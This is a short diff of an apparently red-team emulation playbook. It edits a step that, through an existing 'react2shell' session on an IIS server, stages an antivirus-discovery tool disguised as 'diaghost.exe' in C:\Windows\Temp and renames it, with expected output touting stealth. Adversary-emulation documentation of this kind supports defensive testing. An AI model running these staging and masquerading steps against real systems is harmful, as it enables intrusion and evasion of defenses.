@@ -154,14 +154,14 @@ access and lateral movement activities.
 - ☣️ In the react2shell session (from Phase 1 Step 1A, still open), stage `WmiAvQuery.exe` as `diaghost.exe` to the IIS server — encode + stream + decode in one step; then rename to `.exe`
 
   ```
-  stage ../WmiAvQuery/WmiAvQuery.exe C:\Windows\Temp\diaghost.bin
+  stage ../../discovery/WmiAvQuery/WmiAvQuery.exe C:\Windows\Temp\diaghost.bin
   rename C:\Windows\Temp\diaghost.bin C:\Windows\Temp\diaghost.exe
   ```
 
   - ***Expected Output***
 
     ```text
-    [*] Staging .../WmiAvQuery.exe (...) -> C:\Windows\Temp\diaghost.bin in N chunks ()...
+    [*] Staging .../../discovery/WmiAvQuery.exe (...) -> C:\Windows\Temp\diaghost.bin in N chunks ()...
     [*] Progress: N/N chunks
     [+] File staged successfully -> C:\Windows\Temp\diaghost.bin (... bytes, !)
     [*] Renaming C:\Windows\Temp\diaghost.bin -> C:\Windows\Temp\diaghost.exe via eval (NO spawn - STEALTH!)...
